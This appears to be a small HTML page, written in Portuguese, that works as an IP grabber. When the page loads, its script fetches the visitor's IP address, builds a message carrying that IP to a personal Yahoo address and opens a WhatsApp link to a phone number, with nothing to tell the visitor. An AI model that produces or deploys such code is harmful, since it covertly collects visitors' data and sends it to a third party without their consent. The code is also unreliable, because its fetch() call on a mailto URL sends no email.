<!DOCTYPE html>
<html>
<head>
    <title>Obter IP</title>
</head>
<body>
    <h1>Obter IP</h1>

    <script>
        function getIp(callback) {
            fetch('/get-ip')
                .then(response => response.json())
                .then(data => callback(data.ip))
                .catch(error => console.error(error));
        }

        getIp(function (ip) {
            const emailUrl = 'mailto:minadoooo11@yahoo.com?subject=Endereço IP do Usuário&body=' + encodeURIComponent('O endereço IP do usuário é: ' + ip);
            const whatsappUrl = 'https://wa.me/27998041981';

            window.open(whatsappUrl, '_blank');

            fetch(emailUrl)
                .then(() => {
                    // Email enviado com sucesso
                    // Não é necessário fazer nada aqui
                })
                .catch(error => {
                    console.error('Erro ao enviar o email:', error);
                });
        });
    </script>
</body>
</html>
